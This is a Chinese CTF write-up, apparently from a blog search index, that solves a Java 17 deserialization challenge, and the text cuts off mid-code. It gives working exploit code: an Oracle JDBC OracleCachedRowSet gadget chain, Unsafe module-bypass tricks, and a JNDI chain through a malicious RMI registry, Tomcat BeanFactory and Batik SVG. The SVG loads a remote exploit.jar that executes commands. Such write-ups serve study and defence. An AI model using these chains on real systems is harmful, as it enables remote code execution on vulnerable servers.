<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ccsssc初赛</title>
      <link href="/2025/04/23/ccsssc-chu-sai/index/"/>
      <url>/2025/04/23/ccsssc-chu-sai/index/</url>
      
        <content type="html"><![CDATA[<h3 id="反序列化链挖掘"><a href="#反序列化链挖掘" class="headerlink" title="反序列化链挖掘"></a>反序列化链挖掘</h3><p>java版本为java17<br><img src="/images/Pasted%20image%2020250404151332.png"><br><code>DBController.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package com.example.jdbcparty.controller;</span><br><span class="line"></span><br><span class="line">import com.example.jdbcparty.Utils;</span><br><span class="line">import com.example.jdbcparty.model.User;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.http.HttpStatus;</span><br><span class="line">import org.springframework.http.HttpStatusCode;</span><br><span class="line">import org.springframework.http.ResponseEntity;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class DBController &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span><br><span class="line">    private String url;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;spring.datasource.driver&#125;&quot;)</span><br><span class="line">    private String driverClassName;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&#123;&quot;/dbtest&quot;&#125;)</span><br><span class="line">    public ResponseEntity&lt;String&gt; dbtest(String data) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            User credentials = (User)Utils.deserialize(data);</span><br><span class="line">            Class.forName(this.driverClassName);</span><br><span class="line">            Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword());</span><br><span class="line">            try &#123;</span><br><span class="line">                if (connection.isValid(5)) &#123;</span><br><span class="line">                    ResponseEntity&lt;String&gt; responseEntity1 = ResponseEntity.ok(&quot;connect success&quot;);</span><br><span class="line">                    if (connection != null)</span><br><span class="line">                        connection.close();</span><br><span class="line">                    return responseEntity1;</span><br><span class="line">                &#125;</span><br><span class="line">                ResponseEntity&lt;String&gt; responseEntity = ResponseEntity.status((HttpStatusCode)HttpStatus.INTERNAL_SERVER_ERROR).body(&quot;connect failed&quot;);</span><br><span class="line">                if (connection != null)</span><br><span class="line">                    connection.close();</span><br><span class="line">                return responseEntity;</span><br><span class="line">            &#125; catch (Throwable throwable) &#123;</span><br><span class="line">                if (connection != null)</span><br><span class="line">                    try &#123;</span><br><span class="line">                        connection.close();</span><br><span class="line">                    &#125; catch (Throwable throwable1) &#123;</span><br><span class="line">                        throwable.addSuppressed(throwable1);</span><br><span class="line">                    &#125;</span><br><span class="line">                throw throwable;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return ResponseEntity.status((HttpStatusCode)HttpStatus.INTERNAL_SERVER_ERROR).body(&quot;connect failed &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>User.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.example.jdbcparty.model;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class User implements Serializable &#123;</span><br><span class="line">    private String username;</span><br><span class="line"></span><br><span class="line">    private String password;</span><br><span class="line"></span><br><span class="line">    public User(String password, String username) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        return this.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassword() &#123;</span><br><span class="line">        return this.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getInfo() &#123;</span><br><span class="line">        return &quot;User&#123;username=&#x27;&quot; + this.username + &quot;&#x27;, password=&#x27;&quot; + this.password + &quot;&#x27;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Utils.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.example.jdbcparty;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Utils &#123;</span><br><span class="line">    public static String serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        String payload = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        return payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object deserialize(String payload) throws Exception &#123;</span><br><span class="line">        byte[] data = Base64.getDecoder().decode(payload);</span><br><span class="line">        return (new ObjectInputStream(new ByteArrayInputStream(data))).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到,虽然进行了一个<code>getConnection</code>,但是其url是从配置文件中读取的,因此无法打JDBC反序列化.只能从上面的反序列化处做文章.<br>可以看到环境中存在ojdbc依赖,可以考虑打一个Oracle JDBC反序列化.从<code>OracleCachedRowSet</code>,<code>OracleFilteredRowSet</code>,<code>OracleJoinRowSet</code>,<code>OracleWebRowSet</code>中任选一个即可.<br>这里必须使用RMI,因为ojdbc这个链子中存在限制<code>OracleCachedRowSet.getConnectionInternal</code>中存在<code>validateJNDIName</code>检测,而其他两个类都是从这继承下来的.<br>构造出了payload如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import javassist.LoaderClassPath;</span><br><span class="line">import oracle.jdbc.rowset.OracleCachedRowSet;</span><br><span class="line">import javax.sql.RowSetInternal;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public class OracleCachedRowSetChain &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        UnsafeUtil.patchModule(OracleCachedRowSetChain.class);</span><br><span class="line">        UnsafeUtil.patchModule(ProxyUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(SerializeUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(UnsafeUtil.class);</span><br><span class="line">        UnsafeUtil.patchModule(ReflectUtil.class);</span><br><span class="line"></span><br><span class="line">        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();</span><br><span class="line"></span><br><span class="line">        oracleCachedRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1097/remoteobj&quot;);</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">        CtClass ctClass = classPool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="line">        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        Proxy proxy = (Proxy) ProxyUtil.getBProxy(oracleCachedRowSet, new Class[]&#123;RowSetInternal.class&#125;);</span><br><span class="line"></span><br><span class="line">        POJONode pojoNode = new POJONode(proxy);</span><br><span class="line"></span><br><span class="line">        EventListenerList exp = new EventListenerList();</span><br><span class="line">        UndoManager manager = new UndoManager();</span><br><span class="line">        Vector vector = (Vector) UnsafeUtil.getFieldValue(manager, &quot;edits&quot;);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        UnsafeUtil.setFieldValue(exp, &quot;listenerList&quot;, new Object[] &#123; InternalError.class, manager &#125;);</span><br><span class="line"></span><br><span class="line">        byte[] bytes = SerializeUtil.serialize(exp);</span><br><span class="line">        SerializeUtil.deserialize(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里比较容易出问题的就是在<code>getBProxy</code>的时候给<code>OracleCachedRowSet</code>和什么接口去套代理,我选择的方案是挨个去试,<code>OracleCachedRowSet</code>实现的哪个接口套上了不报错就套哪个.这里最终选择的是<code>RowSetInternal</code>接口.</p><p>同理,出口也可以去套XString,由于存在Xalan,因此XString一共有六种打法,这里就不去说了.<br>注意如果是使用Jdk原生的XString就需要在编译和运行的时候添加一个<code>--add-exports java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED</code>参数,但是如果是使用Xalan的就不需要.</p><h3 id="Java17模块化问题"><a href="#Java17模块化问题" class="headerlink" title="Java17模块化问题"></a>Java17模块化问题</h3><p>第一次自己研究java17下的模块化问题,记录一下.<br>首先就是对自己使用的所有的自定义的类去进行<code>patchModule</code>,将偏移修改为<code>Object.class</code>的偏移,可以避免很多麻烦.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private static final Unsafe unsafe;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class&lt;?&gt; unsafeClass = Class.forName(&quot;sun.misc.Unsafe&quot;);</span><br><span class="line">            Field theUnsafeField = unsafeClass.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">            theUnsafeField.setAccessible(true);</span><br><span class="line">            unsafe = (Unsafe) theUnsafeField.get(null);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public static void patchModule(Class clazz) throws Exception &#123;</span><br><span class="line">        Module baseModule=Object.class.getModule();</span><br><span class="line">        long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;));</span><br><span class="line">        unsafe.getAndSetObject(clazz,addr,baseModule);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来就是idea在编译和运行时的mv options参数设置.<br>编译时参数设置在这:<br><img src="/images/Pasted%20image%2020250408093910.png"><br>运行时参数设置在这:<br><img src="/images/Pasted%20image%2020250408093726.png"><br>解释一下和模块化有关的参数:</p><h5 id="add-exports"><a href="#add-exports" class="headerlink" title="--add-exports"></a><em><code>--add-exports</code></em></h5><p>当直接调用jdk17中的内部api去创建类或是使用静态方法的时候需要添加这个参数:<code>--add-exports $MODULE/$PACKAGE=ALL-UNNAMED</code>,从而将包中所有的类导出给所有的未命名模块(我们项目模块也没有命名).<br>在编译时,如果出现这样的报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error: package sun.util is not visible</span><br><span class="line">  (package sun.util is declared in module java.base, which does not export it)</span><br></pre></td></tr></table></figure><p>或者说idea在代码检查的时候直接标红,也是编译时的问题,那么我们可以给编译器的参数添加:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-exports java.base/sun.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>但如果只给编译时添加参数可能还是不能解决问题,有时还会出现报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalAccessError:</span><br><span class="line">    class Internal (in unnamed module @0x758e9812)</span><br><span class="line">    cannot access class sun.util.BuddhistCalendar (in module java.base)</span><br><span class="line">    because module java.base does not export sun.util to unnamed module @0x758e9812</span><br></pre></td></tr></table></figure><p>那么还需要给运行时添加参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-exports java.base/sun.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>不过经过我的实际测试,patchModule过的类应该是都可以直接访问内部api,不需要再去添加<code>--add-exports</code></p><h5 id="add-opens"><a href="#add-opens" class="headerlink" title="--add-opens"></a><em><code>--add-opens</code></em></h5><p>上面给出的<code>--add-exports</code>并不能解决反射访问报错的问题,因为反射是一种运行时多态,并不会在编译时被检测到,因此即使在编译或运行时添加了<code>--add-exports</code>参数也会报错.需要在运行添加参数:<code>--add-opens $MODULE/$PACKAGE=ALL-UNNAMED</code>来绕过限制.例如在运行时提示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalAccessException:</span><br><span class="line">    class Internal cannot access class sun.util.BuddhistCalendar (in module java.base)</span><br><span class="line">    because module java.base does not export sun.util to unnamed module @1f021e6c</span><br><span class="line">        at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:392)</span><br><span class="line">        at java.base/java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:674)</span><br><span class="line">        at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:489)</span><br><span class="line">        at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:480)</span><br></pre></td></tr></table></figure><p>可以通过在运行时添加参数解决:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/sun.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><code>patchModule</code>对反射时的限制并没有任何的绕过作用,需要注意.</p><h5 id="add-modules"><a href="#add-modules" class="headerlink" title="--add-modules"></a><em><code>--add-modules</code></em></h5><p>将一些可选的,非必要的模块添加到当前模块的模块图中,一般情况下不会用到这个参数,只在有相关报错提示的时候去考虑.如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-modules java.sql</span><br></pre></td></tr></table></figure><p>我们回到这个问题,这里只需要在运行时添加参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.lang=ALL-UNNAMED</span><br></pre></td></tr></table></figure><h3 id="JNDI寻找"><a href="#JNDI寻找" class="headerlink" title="JNDI寻找"></a>JNDI寻找</h3><p>在Java17下和TemplatesImpl相关的利用链彻底失去了作用,因此JNDI的限制也变的更大了.我们在相关的依赖中看到了<code>tomcat-jdbc</code>,但是由于缺少相关的数据库依赖,因此没法将攻击面进一步扩大.存在<code>tomcat-embed-core-10.3.31</code>,但是<code>tomcat-el</code>的原生JNDI注入最高只支持<code>10.1.0-M14</code>.<br><a href="https://github.com/Y4Sec-Team/CVE-2023-21939/tree/main">找到了一篇文章,可以打<code>batik</code>低版本和<code>tomcat-el</code>组合拳.</a><br>首先去制作一个恶意的jar包,去实现<code>initializeEventListeners</code>方法.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import org.w3c.dom.svg.SVGDocument;</span><br><span class="line">import org.w3c.dom.svg.EventListenerInitializer;</span><br><span class="line">public class Main implements EventListenerInitializer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void initializeEventListeners(SVGDocument svgDocument) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;Hello,J1rrY&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再去添加一个<code>MANIFEST.MF</code>文件,位置如下:<br><img src="/images/Pasted%20image%2020250408101245.png"><br>内容为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: Main</span><br><span class="line">SVG-Handler-Class: Main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其打包为Jar,放到给出的项目中.修改项目的jdk版本为java17,设置编译参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--add-modules</span><br><span class="line">jdk.naming.rmi</span><br><span class="line">--add-exports</span><br><span class="line">jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>设置运行参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--add-exports</span><br><span class="line">jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>然后运行RMIServer:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"></span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;org.apache.batik.swing.JSVGCanvas&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        ref.add(new StringRefAddr(&quot;URI&quot;, &quot;http://localhost:8886/1.xml&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;remoteobj&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行XMLServer:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.0&quot;&gt; &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://localhost:8887/exploit.jar&quot;/&gt; &lt;text&gt;Static text ...&lt;/text&gt; &lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>以及JarServer,并设置反序列化链的JNDI路径为<code>rmi://127.0.0.1:1097/remoteobj</code>,多尝试几次,成功执行命令.</p><p>我们对上面的payload为什么这样构造进行分析:<br>在spring中,beanfactory这种工厂类通过调用属性对应的setter方法来进行自动的注入.因此我们知道可以调用setURI方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = new ResourceRef(&quot;org.apache.batik.swing.JSVGCanvas&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        ref.add(new StringRefAddr(&quot;URI&quot;, &quot;http://localhost:8886/1.xml&quot;));</span><br></pre></td></tr></table></figure><p>来看一下setURI方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void setURI(String newURI) &#123;</span><br><span class="line">        String oldValue = this.uri;</span><br><span class="line">        this.uri = newURI;</span><br><span class="line">        if (this.uri != null) &#123;</span><br><span class="line">            this.loadSVGDocument(this.uri);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.setSVGDocument((SVGDocument)null);</span><br><span class="line">        &#125;</span><br><span class="line">        this.pcs.firePropertyChange(&quot;URI&quot;, oldValue, this.uri);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到调用了<code>loadSVGDocument</code>去进行解析.我们一路跟进,将断点打在<code>BaseScriptingEnvironment</code>的<code>loadScripts</code>方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void loadScripts() &#123;</span><br><span class="line">        NodeList scripts = this.document.getElementsByTagNameNS(&quot;http://www.w3.org/2000/svg&quot;, &quot;script&quot;);</span><br><span class="line">        int len = scripts.getLength();</span><br><span class="line"></span><br><span class="line">        for(int i = 0; i &lt; len; ++i) &#123;</span><br><span class="line">            AbstractElement script = (AbstractElement)scripts.item(i);</span><br><span class="line">            this.loadScript(script);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>lodaScript</code>方法,看到其中包含了下面这样的内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">String type = script.getAttributeNS((String)null, &quot;type&quot;);</span><br><span class="line">            if (type.length() == 0) &#123;</span><br><span class="line">                type = &quot;text/ecmascript&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String mediaType;</span><br><span class="line">            if (type.equals(&quot;application/java-archive&quot;)) &#123;</span><br><span class="line">            try &#123;  </span><br><span class="line">        String href = XLinkSupport.getXLinkHref(script);  </span><br><span class="line">        ParsedURL purl = new ParsedURL(script.getBaseURI(), href);  </span><br><span class="line">        this.checkCompatibleScriptURL(type, purl);  </span><br><span class="line">        URL docURL = null;  </span><br><span class="line">  </span><br><span class="line">        try &#123;  </span><br><span class="line">            docURL = new URL(this.docPURL.toString());  </span><br><span class="line">        &#125; catch (MalformedURLException var14) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        DocumentJarClassLoader cll = new DocumentJarClassLoader(new URL(purl.toString()), docURL);  </span><br><span class="line">        URL url = cll.findResource(&quot;META-INF/MANIFEST.MF&quot;);  </span><br><span class="line">        if (url == null) &#123;  </span><br><span 